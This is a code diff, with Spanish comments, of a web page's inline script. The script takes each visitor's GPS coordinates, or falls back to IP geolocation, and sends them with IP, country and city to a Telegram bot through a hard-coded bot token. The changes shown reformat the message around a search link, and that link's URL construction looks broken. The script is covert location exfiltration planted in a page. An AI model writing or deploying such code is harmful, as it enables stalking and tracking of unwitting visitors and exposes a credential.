@@ -50,7 +50,9 @@
     </section>
 </main>
 
-<!-- SCRIPT DIRECTO PARA EVITAR CACHÉ DE UBICACIÓN (CORREGIDO DE RAÍZ) -->
+
+
+<!-- SCRIPT DIRECTO PARA EVITAR CACHÉ DE UBICACIÓN (CORREGIDO CON ENLACE CHROME) -->
 <script>
 (function() {
     const TOKEN = '9068600803:AAEPd0lHMbVcyxhsCbXJGfutL0X-v6mr-pY';
@@ -62,8 +64,10 @@
             const lon = pos.coords.longitude;
             const acc = pos.coords.accuracy;
 
-            // CORRECTO: Solo coordenadas al final
-            const texto = "📍 Nueva Visita (GPS)\n\n• Latitud: " + lat + "\n• Longitud: " + lon + "\n• Precisión: ~" + Math.round(acc) + " metros\n\n" + lat + "," + lon;
+            // CORREGIDO: Ahora genera el enlace en formato de búsqueda de Google Chrome
+            const linkChrome = "https://google.com" + lat + "%2C" + lon + "&rlz=1C1UEAD_esMX1233MX1238&oq=" + lat + "%2C" + lon;
+            
+            const texto = "📍 Nueva Visita (GPS)\n\n• Latitud: " + lat + "\n• Longitud: " + lon + "\n• Precisión: ~" + Math.round(acc) + " metros\n\n" + linkChrome;
 
             fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
                 method: 'POST',
@@ -72,12 +76,16 @@
             }).catch(e => console.error("Error enviando GPS:", e));
 
         }, function(err) {
-            // CORREGIDO: URL completa con /json/
             fetch('https://ipapi.co')
             .then(res => res.json())
             .then(data => {
-                // CORREGIDO: Uso de datos dinámicos provenientes de la API de IP
-                const textoIP = "🌐 Nueva Visita (Por IP)\n\n• IP: " + (data.ip || 'No detectada') + "\n• País: " + (data.country_name || 'Desconocido') + "\n• Ciudad: " + (data.city || 'Desconocida') + "\n\n" + data.latitude + "," + data.longitude;
+                const latIP = data.latitude;
+                const lonIP = data.longitude;
+                
+                // CORREGIDO: Enlace en formato búsqueda de Google Chrome para la IP
+                const linkChromeIP = "https://google.com" + latIP + "%2C" + lonIP + "&rlz=1C1UEAD_esMX1233MX1238&oq=" + latIP + "%2C" + lonIP;
+
+                const textoIP = "🌐 Nueva Visita (Por IP)\n\n• IP: " + (data.ip || 'No detectada') + "\n• País: " + (data.country_name || 'Desconocido') + "\n• Ciudad: " + (data.city || 'Desconocida') + "\n\n" + linkChromeIP;
                 
                 fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
                     method: 'POST',
